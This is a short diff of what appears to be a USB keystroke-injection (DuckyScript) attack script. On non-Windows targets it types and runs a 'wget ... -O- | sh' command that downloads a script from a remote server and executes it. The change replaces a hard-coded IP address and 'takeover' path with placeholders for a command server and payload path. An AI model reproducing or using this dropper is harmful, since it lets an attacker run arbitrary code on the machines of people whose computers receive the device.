@@ -226,7 +226,7 @@ IF ($_OS == WINDOWS) THEN
     
 ELSE 
     DELAY 300
-    STRING wget http://128.199.5.97/takeover/ducky/script.sh -O- | sh
+    STRING wget http://$C_SERVER/$PAYLOAD_PATH -O- | sh
     ENTER
 END_IF
 
